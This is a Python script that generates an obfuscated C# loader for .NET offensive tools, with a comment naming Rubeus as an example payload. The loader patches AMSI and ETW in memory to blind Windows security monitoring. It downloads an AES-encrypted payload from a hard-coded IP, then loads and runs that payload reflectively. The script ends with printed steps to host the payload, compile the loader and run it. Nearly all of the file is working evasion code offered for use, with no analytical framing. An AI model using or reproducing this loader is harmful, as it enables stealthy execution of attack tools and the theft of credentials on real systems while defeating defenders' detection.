#!/usr/bin/env python3
import os
import base64
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def random_string(min_len=5, max_len=12, existing=None):
    existing = existing or set()
    while True:
        length = random.randint(min_len, max_len)
        s = ''.join(random.choice(string.ascii_letters) for _ in range(length))
        if s not in existing:
            existing.add(s)
            return s

def xor_encrypt(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def generate_xor_key() -> int:
    return random.randint(1, 255)

def encrypt_net_binary(net_binary_path, output_path):
    with open(net_binary_path, "rb") as f:
        data = f.read()
    pad = 16 - (len(data) % 16)
    data += bytes([pad]) * pad
    aes_key = os.urandom(32)
    aes_iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(data) + encryptor.finalize()
    with open(output_path, "wb") as f:
        f.write(encrypted)
    return aes_key, aes_iv

plain_strings = [
    "amsi.dll",
    "AmsiScanBuffer",
    "ntdll.dll",
    "EtwEventWrite",
    "kernel32.dll",
    "LoadLibraryA",
    "GetProcAddress",
    "VirtualProtect",
    "http://10.10.15.170/net_binary_enc.bin" # UPDATE THE IP
]

def prepare_xor_strings(strings, xor_key):
    encrypted = []
    for s in strings:
        enc_bytes = xor_encrypt(s.encode('utf-8'), xor_key)
        cs_byte_array = "{" + ", ".join(f"0x{b:02x}" for b in enc_bytes) + "}"
        encrypted.append((s, cs_byte_array))
    return encrypted

def generate_csharp_loader(aes_key_b64, aes_iv_b64, xor_key, encrypted_strings):
    used_names = set()
    class_name = random_string(6, 12, used_names)
    decrypt_strings_method = random_string(6, 10, used_names)
    bypass_amsi = random_string(6, 10, used_names)
    bypass_etw = random_string(6, 10, used_names)
    decrypt_aes = random_string(6, 10, used_names)
    download_method = random_string(6, 10, used_names)
    execute_method = random_string(6, 10, used_names)
    var_args = random_string(4, 8, used_names)
    var_key = random_string(4, 8, used_names)
    var_iv = random_string(4, 8, used_names)
    var_encrypted = random_string(4, 8, used_names)
    var_bytes = random_string(4, 8, used_names)
    var_enc = random_string(4, 8, used_names)
    var_key_byte = random_string(4, 8, used_names)
    var_dec = random_string(4, 8, used_names)
    var_patch = random_string(4, 8, used_names)
    var_old = random_string(4, 8, used_names)
    var_assembly = random_string(4, 8, used_names)
    var_main_method = random_string(4, 8, used_names)
    var_wc = random_string(4, 8, used_names)
    var_aes = random_string(4, 8, used_names)
    var_ms = random_string(4, 8, used_names)
    var_cs = random_string(4, 8, used_names)
    var_url = random_string(4, 8, used_names)
    var_data = random_string(4, 8, used_names)

    xor_key_literal = xor_key

    csharp_code = f"""
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

public class {class_name}
{{
    static string {decrypt_strings_method}(byte[] {var_enc}, byte {var_key_byte})
    {{
        byte[] {var_dec} = new byte[{var_enc}.Length];
        for (int i = 0; i < {var_enc}.Length; i++) {var_dec}[i] = (byte)({var_enc}[i] ^ {var_key_byte});
        return Encoding.UTF8.GetString({var_dec});
    }}
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    static void {bypass_amsi}()
    {{
        try
        {{
            string amsiDll = {decrypt_strings_method}(new byte[] {encrypted_strings[0][1]}, (byte){xor_key_literal});
            string amsiFunc = {decrypt_strings_method}(new byte[] {encrypted_strings[1][1]}, (byte){xor_key_literal});
            IntPtr hModule = LoadLibrary(amsiDll);
            if (hModule == IntPtr.Zero) throw new Exception("LoadLibrary failed");
            IntPtr pFunc = GetProcAddress(hModule, amsiFunc);
            if (pFunc == IntPtr.Zero) throw new Exception("GetProcAddress failed");
            byte[] {var_patch} = {{ 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }};
            uint {var_old};
            VirtualProtect(pFunc, (UIntPtr){var_patch}.Length, 0x40, out {var_old});
            Marshal.Copy({var_patch}, 0, pFunc, {var_patch}.Length);
            uint dummy;
            VirtualProtect(pFunc, (UIntPtr){var_patch}.Length, {var_old}, out dummy);
        }}
        catch (Exception ex) {{ Console.WriteLine("[!] AMSI bypass error: " + ex.Message); }}
    }}
    
    static void {bypass_etw}()
    {{
        try
        {{
            string ntdll = {decrypt_strings_method}(new byte[] {encrypted_strings[2][1]}, (byte){xor_key_literal});
            string etwFunc = {decrypt_strings_method}(new byte[] {encrypted_strings[3][1]}, (byte){xor_key_literal});
            IntPtr hModule = LoadLibrary(ntdll);
            if (hModule == IntPtr.Zero) throw new Exception("LoadLibrary failed");
            IntPtr pFunc = GetProcAddress(hModule, etwFunc);
            if (pFunc == IntPtr.Zero) throw new Exception("GetProcAddress failed");
            byte[] {var_patch} = {{ 0x31, 0xC0, 0xC3 }};
            uint {var_old};
            VirtualProtect(pFunc, (UIntPtr){var_patch}.Length, 0x40, out {var_old});
            Marshal.Copy({var_patch}, 0, pFunc, {var_patch}.Length);
            uint dummy;
            VirtualProtect(pFunc, (UIntPtr){var_patch}.Length, {var_old}, out dummy);
        }}
        catch (Exception ex) {{ Console.WriteLine("[!] ETW bypass error: " + ex.Message); }}
    }}
    
    static byte[] {decrypt_aes}(byte[] {var_data}, byte[] {var_key}, byte[] {var_iv})
    {{
        using (Aes {var_aes} = Aes.Create())
        {{
            {var_aes}.Key = {var_key};
            {var_aes}.IV = {var_iv};
            {var_aes}.Mode = CipherMode.CBC;
            {var_aes}.Padding = PaddingMode.PKCS7;
            using (MemoryStream {var_ms} = new MemoryStream())
            using (CryptoStream {var_cs} = new CryptoStream({var_ms}, {var_aes}.CreateDecryptor(), CryptoStreamMode.Write))
            {{
                {var_cs}.Write({var_data}, 0, {var_data}.Length);
                {var_cs}.FlushFinalBlock();
                return {var_ms}.ToArray();
            }}
        }}
    }}
    
    static byte[] {download_method}(string {var_url})
    {{
        using (WebClient {var_wc} = new WebClient())
        {{
            return {var_wc}.DownloadData({var_url});
        }}
    }}
    
    static void {execute_method}(byte[] {var_bytes}, string[] {var_args})
    {{
        try
        {{
            Assembly {var_assembly} = Assembly.Load({var_bytes});
            MethodInfo {var_main_method} = {var_assembly}.EntryPoint;
            if ({var_main_method} != null)
                {var_main_method}.Invoke(null, new object[] {{ {var_args} }});
            else
                Console.WriteLine("[!] No entry point found.");
        }}
        catch (Exception ex)
        {{
            Console.WriteLine("[!] Execute error: " + ex.ToString());
        }}
    }}
    
    static void Main(string[] {var_args})
    {{
        try
        {{
            Console.WriteLine("[+] Loader started.");
            byte[] {var_key} = Convert.FromBase64String("{aes_key_b64}");
            byte[] {var_iv} = Convert.FromBase64String("{aes_iv_b64}");
            string url = {decrypt_strings_method}(new byte[] {encrypted_strings[8][1]}, (byte){xor_key_literal});
            Console.WriteLine("[+] Downloading from: " + url);
            byte[] {var_encrypted} = {download_method}(url);
            Console.WriteLine("[+] Downloaded " + {var_encrypted}.Length + " bytes.");
            byte[] {var_bytes} = {decrypt_aes}({var_encrypted}, {var_key}, {var_iv});
            Console.WriteLine("[+] Decrypted " + {var_bytes}.Length + " bytes.");
            Console.WriteLine("[+] Applying AMSI bypass...");
            {bypass_amsi}();
            Console.WriteLine("[+] Applying ETW bypass...");
            {bypass_etw}();
            Console.WriteLine("[+] Loading net_binary assembly...");
            {execute_method}({var_bytes}, {var_args});
        }}
        catch (Exception ex)
        {{
            Console.WriteLine("[!] ERROR: " + ex.ToString());
        }}
    }}
}}
"""
    lines = csharp_code.split('\n')
    cleaned = [line for line in lines if not line.strip().startswith('//')]
    return '\n'.join(cleaned)

if __name__ == "__main__":
    NET_BINARY_PATH = "net_binary.exe" # UPDATE THIS PATH TO RUBEUS.EXE for example
    ENC_OUTPUT = "net_binary_enc.bin"
    CS_OUTPUT = "refractionmirage.cs"

    aes_key, aes_iv = encrypt_net_binary(NET_BINARY_PATH, ENC_OUTPUT)
    aes_key_b64 = base64.b64encode(aes_key).decode()
    aes_iv_b64 = base64.b64encode(aes_iv).decode()
    print(f"[+] Encrypted net_binary -> {ENC_OUTPUT}")
    print(f"[+] AES Key (base64): {aes_key_b64}")
    print(f"[+] AES IV (base64): {aes_iv_b64}")

    xor_key = generate_xor_key()
    encrypted_strings = prepare_xor_strings(plain_strings, xor_key)

    cs_code = generate_csharp_loader(aes_key_b64, aes_iv_b64, xor_key, encrypted_strings)
    with open(CS_OUTPUT, "w") as f:
        f.write(cs_code)
    print(f"[+] Obfuscated C# loader written to {CS_OUTPUT}")
    print(f"[+] XOR key for string obfuscation: {xor_key}")
    print("\n[*] Next steps:")
    print(f"    1. Host {ENC_OUTPUT} at http://YOUR.IP/net_binary_enc.bin")
    print("    2. Compile the C# loader")
    print("       C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /out:RefractionMirage.exe refractionmirage.cs")
    print("    3. Run EvilLoader.exe ARGUMENTSHERE")
